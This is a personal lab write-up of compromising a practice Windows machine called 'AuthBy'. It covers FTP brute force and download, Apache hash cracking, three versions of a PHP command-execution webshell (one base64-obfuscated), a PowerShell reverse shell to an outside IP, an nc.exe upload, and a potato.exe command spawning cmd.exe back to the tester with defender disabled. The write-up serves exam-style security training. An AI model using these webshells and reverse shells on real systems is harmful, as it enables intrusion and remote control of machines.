# AuthBy Writeup

Name: AuthBy
Date:  
Difficulty:  
Goals:  
Learnt:
Beyond Root:

- [[AuthBy-Notes.md]]
- [[AuthBy-CMD-by-CMDs.md]]

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

![](hydraftp.png)

```
wget -r ftp://admin:admin@192.168.174.46/
```

![](htpasswd.png)

![](apache1hash.png)

![](hashcatcracked.png)

![](offseceliteforwebpage.png)

![](webadeshell.png)

https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html

![](nowebshellsadness.png)

![](mademyownwebshellfromothers.png)

```php
<html>
<head>
<title>Perspective honing persistence</title>
// Made from simple_cmd.php, simple-backdoor.php
<body>
<form method=POST>
<input type=TEXT name="cmd" size=64 value="<?=$cmd?>"
<input type=TEXT name="systemRequest" size=64 value="<?=$systemRequest?>"
<hr>
</form>
<?php $cmd = $_REQUEST["cmd"];?>
<?php if ($cmd != "") { print Shell_Exec($cmd); } else { echo "cmd=";}?>
<?php
if(isset($_REQUEST['systemRequest'])){
        echo "<pre>";
        $systemRequest = ($_REQUEST['systemRequest']);
        system($systemRequest);
        echo "</pre>";
        die;
}
?>
</body>
</html>
```

[Online php-obfuscator](https://www.gaijin.at/en/tools/php-obfuscator) from [[Wreath-Writeup]] may also help
```php
<html>
<head>
<title>Perspective honing persistence</title>
// Made from simple_cmd.php, simple-backdoor.php
<body>
<form method=POST>
<input type=TEXT name="cmd" size=64 value="<?=$edfff0a7fa1a5?>"
<input type=TEXT name="systemRequest" size=64 value="<?=$k06ca1b7b4ed8?>"
<hr>
</form>
<?php $edfff0a7fa1a5=$_REQUEST[base64_decode('Y21k')];?>
<?php if($edfff0a7fa1a5!=''){printShell_Exec($edfff0a7fa1a5);}else{echo base64_decode('Y21kPQ==');}?>
<?php if(isset($_REQUEST[base64_decode('c3lzdGVtUmVxdWVzdA==')])){echo base64_decode('PHByZT4=');$k06ca1b7b4ed8=($_REQUEST[base64_decode('c3lzdGVtUmVxdWVzdA==')]);system($k06ca1b7b4ed8);echo base64_decode('PC9wcmU+');die;}?>
</body>
</html>
```

![](addederrorreportingzero.png)

```php
<html>
<head>
<title>Perspective honing persistence</title>
// Made from simple_cmd.php, simple-backdoor.php
<body>
<form method=POST>
<input type=TEXT name="cmd" size=64 value="<?=$cmd?>"
<input type=TEXT name="systemRequest" size=64 value="<?=$systemRequest?>"
<hr>
</form>
<?php error_reporting(0);?>
<?php $cmd = $_REQUEST["cmd"];?>
<?php if ($cmd != "") { print Shell_Exec($cmd); } else { echo "cmd=";}?>
<?php
if(isset($_REQUEST['systemRequest'])){
        echo "<pre>";
        $systemRequest = ($_REQUEST['systemRequest']);
        system($systemRequest);
        echo "</pre>";
        die;
}
?>
</body>
</html>

```


Alh4zr3d's obfuscate reverse shell is just this with the variables changed, save this to a .txt file alter variables where required
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

He then base64, little endians it: convert it to UTF-16LE, which the Windows Default encoding, encodes it to base64 then removes the newline .
```bash
iconv -f ASCII -t UTF-16LE $reverseshell.txt | base64 | tr -d "\n"
```

Using Powershell did not work. Uploaded nc.exe felt very dirty doing so.
![](ncupload.png)


![](livda.png)

Uploaded JuicyPotato exploit - [decoder exploit blog](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/) via FTP as presumably for FTP is being used by an administrator to interact with this box so no need for smelling the juiciest of potatoes, which smell very, very bad. 
![](juicypotato.png)

Forgot that my arsenal was not categorised correctly and uploaded the x64 version, because I am stupid. So used not being able to run `systeminfo` 

![](systeminfo.png)

I will use the BITS CLSID to remind myself of the exploit more than anything:
```
{69AD4AEE-51BE-439b-A92C-86AE490E8B30}
```

Then...reread what is vulnerable and what is not vulnerable and why from various source such as [jlajara](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#genericPotato).

Double checking for the wpad entry
![](nowpadentry.png)

As per ACTUALLY READING THE INSTRUCTIONS
![](window2008server.png)


```
.\potato.exe -ip 127.0.0.1 -cmd "c:\wamp\www\nc.exe 192.168.45.225 6969 -e c:\windows\system32\cmd.exe" -disable_exhaust true -disable_defender true --spoof_host WPAD.EMC.LOCAL
```

## Exploit



## Foothold

## PrivEsc

![](AuthBy-map.excalidraw.md)

## Beyond Root

PHP webshell for Pentesting - does all the techniques and tricks to empirical test which works and which does not to make reporting and remembering a language I can barely say I can use easier.

